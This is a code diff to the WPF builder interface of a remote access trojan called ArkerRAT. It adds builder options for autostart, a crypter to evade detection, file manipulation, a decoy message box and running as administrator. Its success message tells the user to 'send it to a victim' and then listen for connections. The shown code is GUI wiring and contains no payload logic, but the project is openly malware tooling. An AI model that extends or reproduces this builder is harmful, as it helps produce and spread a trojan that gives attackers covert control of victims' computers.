@@ -475,7 +475,8 @@ namespace ArkerRatWpfVersion
 
         private void Build(object sender, RoutedEventArgs e)
         {
-            Builder arkerBuilder = new Builder(iPInput.Text, buildPort.Text);
+            Builder arkerBuilder = new Builder(iPInput.Text, buildPort.Text, fileName.Text, (bool)autoStartOnOff.IsChecked, (bool)crypterOnOff.IsChecked,fileManip.Text,(bool)fileManipOnOff.IsChecked,titleInput.Text,massageInput.Text, 
+                (bool)msgBoxOnOff.IsChecked, (bool)runasAdmin.IsChecked);
 
             MessageBox.Show("ArkerRAT has been compiled SUCCESSFULLY send it to a victim, and start listening for conections at the network tab. " +
                "All the available clients will be shown at the clients tab.");
@@ -580,6 +581,28 @@ namespace ArkerRatWpfVersion
                
                     clientDataGrid.Items.Add(ArkerRATServerMechanics.rATClients[y].dataItem);
             }
+        }
+
+        private void msgBoxOnOff_Checked(object sender, RoutedEventArgs e)
+        {
+                massageInput.IsEnabled = true;
+                titleInput.IsEnabled = true;            
+        }
+
+        private void msgBoxOnOff_Unchecked(object sender, RoutedEventArgs e)
+        {
+            massageInput.IsEnabled = false;
+            titleInput.IsEnabled = false;
+        }
+
+        private void fileManipOnOff_Unchecked(object sender, RoutedEventArgs e)
+        {
+            fileManip.IsEnabled = false;
+        }
+
+        private void fileManipOnOff_Checked(object sender, RoutedEventArgs e)
+        {
+            fileManip.IsEnabled = true;
         }
     }
 }
